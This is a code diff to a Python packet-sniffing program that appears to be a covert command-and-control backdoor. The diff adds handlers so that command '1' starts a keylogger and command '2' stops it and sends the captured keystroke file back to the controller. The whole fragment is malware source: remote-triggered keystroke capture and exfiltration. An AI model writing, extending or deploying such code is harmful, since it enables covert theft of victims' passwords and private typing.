@@ -23,6 +23,7 @@ from os import setuid, setgid
 from os import path
 
 import encryption
+import utils
 import textwrap
 import subprocess
 from scapy.all import *
@@ -238,8 +239,12 @@ def process_sniff_pkt(pkt):
         instruction = commands[2]
         if instruction == "1":
             print(instruction)
+            utils.start_keylogger()
         elif instruction == "2":
             print(instruction)
+            file_path = utils.stop_keylogger()
+            binary_file, file_name = get_file_binary(file_path)
+            send_message(binary_file, instruction, file_name)
         elif instruction == "3":
             instruction_input = commands[3]
             print(instruction)
